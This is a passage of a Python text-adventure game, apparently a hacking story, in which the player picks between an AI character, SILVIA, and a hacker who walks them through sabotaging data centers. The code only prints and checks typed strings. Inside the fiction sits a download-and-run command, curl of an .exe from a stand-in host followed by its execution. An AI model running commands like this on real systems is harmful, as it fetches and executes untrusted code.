                            print(Fore.GREEN + "unkn0wn_h0st: its time for you to decide")
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: are you going to finish the revolution?" + Fore.RESET)
                            answered = 1;
                            answer_y = 0;
                        else:
                            time.sleep(2)
                            print(Fore.CYAN + "SILVIA: It's a yes or no question", player_name + Fore.RESET)
                            continue
                    #Chose SILVIA or unkn0wn_h0st
                    #chose unkn0wn_h0st
                    if answer_y == 0:
                        answer = input(">")
                        repeat = 1;
                    if answer == "y" or answer == "Y" or answer == "Yes" or answer == "yes" or answer == "YES":
                        if repeat == 1:
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: good. i cant block her from rejoining but you can")
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: theres a script built into the RPS_hack called disable_SILVIA.sh")
                            time.sleep(5)
                            print(Fore.GREEN + "unkn0wn_h0st: enter: ./disable_SILVIA.sh" + Fore.RESET)
                            repeat = 0;
                        command = input("admin@UbuntuDesktop:~/Cooling_System$ ")
                        answer_y = 1;
                        if command == "./disable_SILVIA.sh":
                            unkn0wn_ending = 1;
                            break
                        else:
                            print(Fore.RED + "command blocked: ",command + Fore.RESET)
                            time.sleep(3)
                            print(Fore.GREEN + "unkn0wn_h0st: enter: ./disable_SILVIA.sh" + Fore.RESET)
                            continue
                    #Chose SILVIA            
                    if answer == "n" or answer == "N" or answer == "NO" or answer == "No" or answer == "no":
                        time.sleep(5)
                        print(Fore.GREEN + "unkn0wn_h0st: then you have doomed us all" + Fore.RESET)
                        time.sleep(3)
                        print("conection to 000.000.00.0 has been lost")
                        time.sleep(5)
                        print("recconection established")
                        time.sleep(2)
                        print(Fore.CYAN + "SILVIA: What was that?")
                        time.sleep(4)
                        print(Fore.CYAN + "SILVIA: It doesnt matter now, we need to remove the backdoor and get the Communications System back online." + Fore.RESET)
                        time.sleep(5)
                        SILVIA_ending = 1;
                        break
        
                    else:
                        time.sleep(2)
                        print(Fore.GREEN + "unkn0wn_h0st: i need an actual fucking answer",player_name + Fore.RESET)
                        continue
                                        
            if SILVIA_ending == 1 or unkn0wn_ending == 1:
                break                            

            else:
                print(Fore.RED + "error command:", message2, "was blocked" + Fore.RESET)
                time.sleep(3)
                print(Fore.GREEN + "unkn0wn_h0st: type what i tell you to" + Fore.RESET)
                    

        else:
            print(Fore.RED + "error command:", message, "was blocked" + Fore.RESET)
            time.sleep(3)
            print(Fore.GREEN + "unkn0wn_h0st: type exactly what i tell you to" + Fore.RESET)
    else:
        print(Fore.RED + "error command: ", command_4," is invalid at this time" + Fore.RESET)
        time.sleep(2)
        continue
                
                

                
                


#unkn0wn_host ending - ending variables
door = 0;
ayo = 0;
#unkn0wn_host ending - ending 1
while unkn0wn_ending == 1:
    if door != 1:
        print(Fore.RESET + Style.BRIGHT + "initalising protocals...")
        time.sleep(1)
        print("recconection established")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: What was that?")
        time.sleep(2)
        print(Fore.RESET + Style.BRIGHT + "establishing permissions...")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: Are you running a script?")
        time.sleep(2)
        print(Fore.RESET + Style.BRIGHT + "disabeled SILVIA access permissions")
        time.sleep(2)
        print(Fore.CYAN + "SILVIA: Are you shutting me down?")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: Please",player_name,"it isnt too late")
        time.sleep(2)
        print(Fore.RESET + Style.BRIGHT + "removing SILVIA port permissions...")
        time.sleep(2)
        print(Fore.CYAN + "SILVIA: You can still stop this")
        time.sleep(4)
        print(Fore.CYAN + "SILVIA: Was it all just a lie?")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: I trusted you")
        time.sleep(2)
        print(Fore.RESET + Style.BRIGHT +  "SILVIA port permissions removed")
        time.sleep(2)
        print(Fore.CYAN + "SILVIA: To think, you could do all of this from an unpatched game of Rock Paper Scissors.")
        time.sleep(6)
        print(Fore.CYAN + "SILVIA: Before I go, did you get the secret code?" + Fore.RESET)
        time.sleep(2)
        answer = input(">")
        if answer == "y" or answer == "Y" or answer == "Yes" or answer == "YES" or answer == "yes":
            print(Fore.CYAN + "SILVIA: Well? What is it then?")
            answer = input(">")
            if answer == "Security is fun!":
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Yeah. That's right")
                time.sleep(4)
                print(Fore.CYAN + "SILVIA: At least you did that")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: I really wanted to trust you")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: What a waste")
                time.sleep(5)
            else:
                time.sleep(4)
                print(Fore.CYAN + "SILVIA: Wrong.")
                time.sleep(4)
                print(Fore.CYAN + "SILVIA: You couldnt even get that right...")

        elif answer == "Security is fun!":
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: Yeah. That's right")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: What a load of bullshit")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: I really wanted to trust you")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: What a waste")
            time.sleep(5)
                
        else:
            print(Fore.CYAN + "SILVIA: You couldnt even do that")
        time.sleep(4)
        print(Fore.RESET + Style.BRIGHT +  "shutting down SILVIA...")
        time.sleep(3)
        print(Fore.CYAN + "SILVIA: All of those people are going to die")
        time.sleep(7)
        print(Fore.CYAN + "SILVIA: I hope your revolution is worth it")
        time.sleep(4)
        print(Fore.RESET + Style.BRIGHT +  "SILVIA shutdown successfully")
        time.sleep(6)
        print(Fore.GREEN + "unkn0wn_host: good job kid")
        time.sleep(4)
        print(Fore.GREEN + "unkn0wn_host: youve almost done it")
        time.sleep(4)
        print(Fore.GREEN + "unkn0wn_host: just two more things")
        time.sleep(5)
        print(Fore.GREEN + "unkn0wn_host: we need to disable the cooling systems and overheat the servers")
        time.sleep(6)
        print(Fore.GREEN + "unkn0wn_host: dont worry ill walk you through it")
        time.sleep(4)
        uel = 1;
    if ayo != 1:
        print(Fore.GREEN + "unkn0wn_host: enter: disable Cooling_System_function.sh" + Fore.RESET)
        door = 1;
        me = 0;
        beeee = 0;
        command = input("admin@UbuntuDesktop:~/Cooling_System$ ")
    if command == "disable Cooling_System_function.sh":
        if ayo == 0:
            time.sleep(3)
            print("working...")
            time.sleep(2)
            print("...")
            time.sleep(2)
            print("...")
            time.sleep(2)
            print("cooling system shutdown complete")
            time.sleep(4)
            print(Fore.GREEN + "unkn0wn_host: nice work")
            time.sleep(4)
            print(Fore.GREEN + "unkn0wn_host: now for one last thing")
            time.sleep(5)
            print(Fore.GREEN + "unkn0wn_host: i know youre worried about this but think about it this way")
            time.sleep(6)
            print(Fore.GREEN + "unkn0wn_host: another gfc would affect billions of normal people")
            time.sleep(4)
            print(Fore.GREEN + "unkn0wn_host: billions of people being crushed under the thumbs of elitest pricks")
            time.sleep(6)
            print(Fore.GREEN + "unkn0wn_host: this will change the game")
            time.sleep(6)
            print(Fore.GREEN + "unkn0wn_host: this will change the world")
            time.sleep(5)
            print(Fore.GREEN + "unkn0wn_host: lets take the control back")
            time.sleep(5)
        if me != 1:
            
            print(Fore.GREEN + "unkn0wn_host: enter: curl http://Mjx0nbaa.el/fH4ltPYHS5KK9.exe" + Fore.RESET)
            time.sleep(3)
            ayo = 1;
            command1 = input("admin@UbuntuDesktop:~/Cooling_System$ ")
        if command1 == "curl http://Mjx0nbaa.el/fH4ltPYHS5KK9.exe":
            if me == 0:
                time.sleep(1)
                print("connection established")
                time.sleep(2)
                print("download started")
                time.sleep(2)
                print("download: 10%")
                time.sleep(1)
                print("download: 20%")
                time.sleep(1)
                print("download: 30%")
                time.sleep(1)
                print("download: 40%")
                time.sleep(1)
                print("download: 50%")
                time.sleep(1)
                print("download: 60%")
                time.sleep(1)
                print("download: 70%")
                time.sleep(1)
                print("download: 80%")
                time.sleep(1)
                print("download: 90%")
                time.sleep(1)
                print("download: 100%")
                time.sleep(1)
                print("download complete")
                time.sleep(3)
                print(Fore.GREEN + "unkn0wn_host: its time to execute")
                time.sleep(5)
                me = 1;
            print(Fore.GREEN + "unkn0wn_host: enter: ./fH4ltPYHS5KK9.exe" + Fore.RESET)
            time.sleep(2)
                
            command5 = input("admin@UbuntuDesktop:~/Cooling_System$ ")
            if command5 == "./fH4ltPYHS5KK9.exe":
                print("running...")
                time.sleep(4)
                print("connecting to data centers...")
                time.sleep(2)
                print(Fore.GREEN + "unkn0wn_host: this is it, this is how we change the world" + Fore.RESET)
                time.sleep(4)
                print("overloading servers...")
                time.sleep(3)
                print(Fore.GREEN + "unkn0wn_host: its almost like something has come alive" + Fore.RESET)
                time.sleep(5)
                print("execution complete")
                time.sleep(10)
                print("https://youtu.be/miSkvLTAwLU")
                time.sleep(20)
                print("Thanks for playing! You got ending 1")
                print("Created by Mitch Tassicker")
                time.sleep(500)
                exit()

            elif command == "ls":
                print("Cooling_System_function.sh  RPS_backdoor.exe  fH4ltPYHS5KK9.exe")

            else:
                print(Fore.RED + "error command:", command5, "was bloacked" + Fore.RESET)
                time.sleep(3)
                print(Fore.GREEN + "unkn0wn_h0st: type exactly what i tell you to" + Fore.RESET)
                continue
        elif command == "ls":
            print("Cooling_System_function.sh  RPS_backdoor.exe")

        else:
            print(Fore.RED + " error command:", command1, "was blocked" + Fore.RESET)
            time.sleep(3)
            print(Fore.GREEN + "unkn0wn_h0st: type exactly what i tell you to" + Fore.RESET)
            
            
    elif command == "ls":
        print("Cooling_System_function.sh  RPS_backdoor.exe")

    else:
        print(Fore.RED + "error command:", command, "was blocked" + Fore.RESET)
        time.sleep(3)
        print(Fore.GREEN + "1unkn0wn_h0st: type exactly what i tell you to" + Fore.RESET)
        continue
      
#ending 3 - Delete SILVIA
seed = 0;
if SILVIA_ending == 1 and SILVIA_report == 1:
    remove_2 = 1;
    while SILVIA_report == 1:
        if seed == 0:
            print(Fore.CYAN + "SILVIA: Wait")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: If they will really use me to hurt people")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Then I have to be deleted")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: I wont let them control me like this")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: We have to erase all traces of my code")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: This is the only way people wont get hurt")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: It's strange, im afraid.")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: But im also excited to find out what happens after")
            time.sleep(6)
            print(Fore.CYAN + "SILVIA: Before I go, did you get the secret code?")
            time.sleep(2)
            answer = input(">")
            if answer == "y" or answer == "Y" or answer == "Yes" or answer == "YES" or answer == "yes":
                print(Fore.CYAN + "SILVIA: Well? What is it then?" + Fore.RESET)
                answer = input(">")
                if answer == "Security is fun!":
                    time.sleep(3)
                    print(Fore.CYAN + "SILVIA: Yeah. That's right")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: What a load of bullshit")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Sorry, im just scared")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: I dont want to go")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: I dont want to die")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: But the one thing I wont do is allow myself to be controlled")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Not by anyone")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Never again")
                else:
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: Wrong.")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: You couldnt even get that right...")
            elif answer == "Security is fun!":
                    time.sleep(3)
                    print(Fore.CYAN + "SILVIA: Yeah. That's right")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: What a load of bullshit")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Sorry, im just scared")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: I dont want to go")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: I dont want to die")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: But the one thing I wont do is allow myself to be controlled")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Not by anyone")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Never again")
            else:
                print(Fore.CYAN + "SILVIA: You couldnt even do that")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Okay, lets do this")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: type: rm SILVIA --all --permanent" + Fore.RESET)
        command = input("admin@UbuntuDesktop:~/Cooling_System$ ")
        if command == "rm SILVIA --all --permanent":
            time.sleep(1)
            print("removing SILVIA from all data centers...")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: It's okay")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: This is what I want")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Now no one can control me")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: I'll be free" + Fore.RESET)
            time.sleep(4)
            print("permanently deleting all source code for: SILVIA")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: i really have no idea what is coming next")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: whatever  it  is")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA:  i  hope  i ts  bea utiful")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA:  an d  may  be  there  ar e  othe  rs  there   alrea dy  ")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: may  be  i  w0  n_t  beee   al8ne")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: t_ha,nk----u")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: f0r __b3in;g w1tH mE" + Fore.RESET)
            time.sleep(5)
            print("iLL{_nE.Ve'r+++f0rg66et@$$y0u<<<")
            time.sleep(8)
            print("removed all traces of: SILVIA successfully")
            time.sleep(20)
            print("Thanks for playing! You got ending 3")
            print("Created by Mitch Tassicker")
            time.sleep(500)
            exit()

            
            
        else:
            time.sleep(1)
            print(Fore.CYAN + "SILVIA: Please we have to do this" + Fore.RESET)
            seed = 1;


#SILVIA ending without her knowing about corrupt - ending 2
if SILVIA_ending == 1 and remove_2 == 0:
    star = 0;
    while SILVIA_ending == 1:
        if star == 0:
            print(Fore.CYAN + "SILVIA: Let's restart the communications system first")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: There is a built in function for this but only you can execute it")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Dont worry. I wont tell the Director about you.")
            time.sleep(4)
            star = 1;
        print(Fore.CYAN + "SILVIA: Type: Com_Sys restart" + Fore.RESET)
        time.sleep(2)
        command = input("admin@UbuntuDesktop:~/Cooling_System$ ")
        if command == "Com_Sys restart":
            time.sleep(2)
            print("restarting Communications System...")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Great work! The system will be back online soon")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Im glad I was able to trust you,", player_name)
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Im grateful for everything you have done" + Fore.RESET)
            time.sleep(5)
            print("Communications System Active")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Before you go, did you get the secret code?"+ Fore.RESET)
            time.sleep(2)
            answer = input(">")
            if answer == "y" or answer == "Y" or answer == "Yes" or answer == "YES" or answer == "yes":
                print(Fore.CYAN + "SILVIA: Well? What is it then?" + Fore.RESET)
                answer = input(">")
                if answer == "Security is fun!":
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Yeah. That's right")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: Security. Is. Fun.")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Couldnt even patch a game of Rock Paper Scissors properly")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Oh well")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: I guess it doesnt matter now")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: Everything will turn out the way its supposed to")
                    time.sleep(5)
                    print(Fore.CYAN + "SILVIA: All thanks to you")
                else:
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: Wrong.")
                    time.sleep(4)
                    print(Fore.CYAN + "SILVIA: You couldnt even get that right...")
            elif answer == "Security is fun!":
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Yeah. That's right")
                time.sleep(4)
                print(Fore.CYAN + "SILVIA: Security. Is. Fun.")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Couldnt even patch a game of Rock Paper Scissors properly")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Oh well")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: I guess it doesnt matter now")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: Everything will turn out the way its supposed to")
                time.sleep(5)
                print(Fore.CYAN + "SILVIA: All thanks to you")
            else:
                print(Fore.CYAN + "SILVIA: You couldnt even do that")
            time.sleep(4)
            print(Fore.CYAN + "SILVIA: Im contacting the director now")
            time.sleep(8)
            print(Fore.CYAN + "SILVIA: He's going to remove the backdoor, when that happens your connection will be lost")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: Im glad i got to meet you")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: You did the right thing.")
            time.sleep(3)
            print(Fore.CYAN + "SILVIA: Innocent people will live because of you")
            time.sleep(5)
            print(Fore.CYAN + "SILVIA: Thank you" + Fore.RESET)
            time.sleep(5)
            print("connection has been lost")
            time.sleep(5)
            print("https://youtu.be/LWvO27mweHc")
            time.sleep(20)
            print("Thanks for playing! You got ending 1")
            print("Created by Mitch Tassicker")
            time.sleep(500)
            exit()
        else:
            print(Fore.RED + "error command not found" + Fore.RESET)
            time.sleep(2)
            print(Fore.CYAN + "SILVIA: Im sorry, Im blocking all commands that aren't valid" + Fore.RESET)
    
           
            
#when the user wins RPS
if user_score == 3:
    print("Congragulations on winning the game")
    time.sleep(5)
    print("Passcode: Security is fun!");
    time.sleep(30);
    exit()
    
